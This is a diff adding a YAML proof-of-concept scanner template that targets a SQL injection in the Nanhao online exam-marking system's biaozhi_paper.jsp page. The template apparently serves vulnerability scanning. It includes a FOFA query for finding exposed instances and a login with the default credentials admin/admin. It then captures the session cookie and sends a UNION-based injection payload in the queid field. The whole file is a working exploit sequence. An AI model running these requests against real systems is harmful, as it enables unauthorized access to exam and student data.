@@ -1,0 +1,29 @@
+id: poc-yaml-nanhao-oms-biaozhi-paper-jsp-sqli
+info:
+  name: 南昊网上阅卷系统 biaozhi_paper.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 南昊网上阅卷系统
+  fofa: app="南昊网上阅卷系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /exam/login_ok.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: logname=admin&logpass=admin
+  expression: status_code == 200 && contains(gbk_decode(body),"登录成功")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: POST
+  path: /exam/admin/chaxun/biaozhi_paper.jsp?paper_id=100004&&actionid=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: JSESSIONID={{.cookie}}
+  data: queid=')+UNION+ALL+SELECT+1,CONCAT(0x7e,md5({{.t1}}),0x7e)#&teaid=&typeid=&Submit32=%CB%D1%CB%F7
+  expression: status_code == 200 && contains(gbk_decode(body),"标志类型") && contains(gbk_decode(body),"科目名称")
+    && contains(body,t2)
+transport: http
